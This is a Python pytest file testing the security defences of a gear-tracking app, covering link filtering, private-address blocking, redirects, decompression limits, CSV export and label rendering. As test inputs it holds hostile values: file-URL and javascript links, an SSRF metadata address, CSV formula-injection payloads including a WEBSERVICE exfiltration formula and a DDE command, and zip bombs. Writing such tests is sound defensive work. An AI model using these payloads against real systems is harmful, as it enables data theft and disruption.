"""The protections: links, downloads, spreadsheets, text shown on screen."""

from __future__ import annotations

import time
import zlib

import pytest

from bodega.core import importer, prices, web
from bodega.core.model import Item


def test_only_web_links_count():
    assert web.web_link("bhphotovideo.com/c/product/1") == "https://bhphotovideo.com/c/product/1"
    assert web.web_link("https://example.com:8443/x") == "https://example.com:8443/x"
    for bad in (
        "file:///etc/passwd",
        "file://attacker.com/share/x.exe",
        "smb://server/share",
        "javascript:alert(1)",
        "mailto:a@b.com",
        "ms-settings:display",
        "localhost:8080/x",
        "https://exa mple.com",
        "",
    ):
        assert web.web_link(bad) == "", bad


@pytest.mark.parametrize("host_ip", ["127.0.0.1", "10.0.0.1", "192.168.1.1", "169.254.169.254", "::1", "fd00::1"])
def test_private_addresses_are_blocked(monkeypatch, host_ip):
    import socket

    monkeypatch.setattr(socket, "getaddrinfo", lambda *a, **k: [(0, 0, 0, "", (host_ip, 443))])
    with pytest.raises(web.Blocked):
        web.check_public("router.example.com")


def test_public_addresses_pass(monkeypatch):
    import socket

    monkeypatch.setattr(socket, "getaddrinfo", lambda *a, **k: [(0, 0, 0, "", ("93.184.215.14", 443))])
    web.check_public("example.com")


def test_a_redirect_to_a_private_address_is_refused(monkeypatch):
    import socket
    from email.message import Message

    def resolve(host, *a, **k):
        return [(0, 0, 0, "", ("93.184.215.14" if host == "shop.example.com" else "192.168.1.1", 443))]

    def get(url, ip, timeout, max_bytes):
        h = Message()
        h["Location"] = "https://router.local.example/admin"
        return web._Reply(302, h, b"")

    monkeypatch.setattr(socket, "getaddrinfo", resolve)
    monkeypatch.setattr(web, "_get", get)
    with pytest.raises(web.Blocked):
        web.fetch("https://shop.example.com/item")


def test_it_connects_to_the_address_it_checked(monkeypatch):
    import socket
    from email.message import Message

    seen = []
    monkeypatch.setattr(socket, "getaddrinfo", lambda *a, **k: [(0, 0, 0, "", ("93.184.215.14", 443))])

    def get(url, ip, timeout, max_bytes):
        seen.append(ip)
        h = Message()
        h["Content-Type"] = "text/html; charset=idna"  # a charset Python can't decode with
        return web._Reply(200, h, b"<title>ok</title>")

    monkeypatch.setattr(web, "_get", get)
    page = web.fetch("https://shop.example.com/x")
    assert seen == ["93.184.215.14"] and "ok" in page.html


def test_broken_redirects_are_refused_politely(monkeypatch):
    import socket
    from email.message import Message

    monkeypatch.setattr(socket, "getaddrinfo", lambda *a, **k: [(0, 0, 0, "", ("93.184.215.14", 443))])

    def get(url, ip, timeout, max_bytes):
        h = Message()
        h["Location"] = "https://[oops/"
        return web._Reply(302, h, b"")

    monkeypatch.setattr(web, "_get", get)
    with pytest.raises(OSError):
        web.fetch("https://shop.example.com/x")


@pytest.mark.parametrize("status", [401, 403, 429, 503])
def test_a_store_that_turns_bodega_away_is_named(monkeypatch, status):
    import socket
    from email.message import Message

    monkeypatch.setattr(socket, "getaddrinfo", lambda *a, **k: [(0, 0, 0, "", ("93.184.215.14", 443))])
    monkeypatch.setattr(web, "_get", lambda url, ip, timeout, max_bytes: web._Reply(status, Message(), b""))
    link = "https://www.bhphotovideo.com/c/product/1592483-REG/sony_fx6.html"
    with pytest.raises(web.Refused, match=r"^B&H "):
        web.fetch(link)
    with pytest.raises(web.Refused, match=r"^B&H "):  # Check Price can tell it apart, and offer the way round
        prices.fetch(link)


def test_tricky_links_are_not_web_links():
    for bad in (
        "https://[x",
        "https://[::1",
        "http://[evil.com]/",
        "https://bhphotovideo.com@evil.com/x",
        "https://a:b@evil.com",
        "https://evil.com:99999/",
        "https://evil.com:abc/",
        "https://ev%69l.com",
    ):
        assert web.web_link(bad) == "", bad


@pytest.mark.parametrize("addr", ["::ffff:127.0.0.1", "64:ff9b::7f00:1", "::127.0.0.1", "2002:c0a8:0101::1"])
def test_ipv6_wrappers_of_private_addresses_are_blocked(monkeypatch, addr):
    import socket

    monkeypatch.setattr(socket, "getaddrinfo", lambda *a, **k: [(0, 0, 0, "", (addr, 443))])
    with pytest.raises(web.Blocked):
        web.check_public("sneaky.example.com")


def test_unpacking_is_capped():
    bomb = zlib.compress(b"0" * 50_000_000)  # 50 MB of zeros packs to ~50 KB
    out = web._unpack(bomb, "deflate", 1_000_000)
    assert len(out) <= 1_000_000


def test_a_hostile_page_cant_freeze_the_price_reader():
    page = "<meta " + 'content="x" ' * 20000  # took the old reader many seconds
    start = time.monotonic()
    prices.parse(page)
    assert time.monotonic() - start < 2


def test_prices_still_read():
    assert prices.parse('<meta property="product:price:amount" content="1,299.00">')[0] == 1299
    ld = '<script type="application/ld+json">{"offers": {"price": "549.95"}}</script>'
    assert str(prices.parse(ld)[0]) == "549.95"


def test_csv_export_cant_carry_formulas(tmp_path):
    evil = Item(name='=WEBSERVICE("http://x/?"&C2)', notes="+cmd|' /C calc'!A0", value="-50")
    path = importer.write_csv([evil], {evil.id: evil}, tmp_path / "gear.csv")
    text = path.read_text(encoding="utf-8-sig")
    assert "'=WEBSERVICE" in text and "'+cmd" in text and ",-50," in text
    back = importer.read(path).items[0]  # and our own CSV reads back as it was
    assert back.name == evil.name and back.notes == evil.notes


def test_imported_links_must_be_web_pages():
    rows = [["Name", "Link"], ["Light", "file://attacker.com/x.exe"], ["Stand", "bhphotovideo.com/stand"]]
    items = importer.parse_rows(rows).items
    assert items[0].link == "" and items[1].link == "https://bhphotovideo.com/stand"


def test_oversized_spreadsheets_are_refused(tmp_path, monkeypatch):
    import zipfile

    path = tmp_path / "bomb.xlsx"
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("xl/worksheets/sheet1.xml", b"0" * 3_000_000)
    monkeypatch.setattr(importer, "MAX_UNPACKED_BYTES", 1_000_000)
    with pytest.raises(OSError, match="too big"):
        importer.load_rows(path)


def test_names_show_as_typed(qapp):
    from PySide6.QtCore import Qt
    from PySide6.QtWidgets import QLabel

    from bodega.app import setup_app

    setup_app(qapp)
    lbl = QLabel('<img src="x.png"> Evil')
    lbl.ensurePolished()
    assert lbl.textFormat() == Qt.TextFormat.PlainText
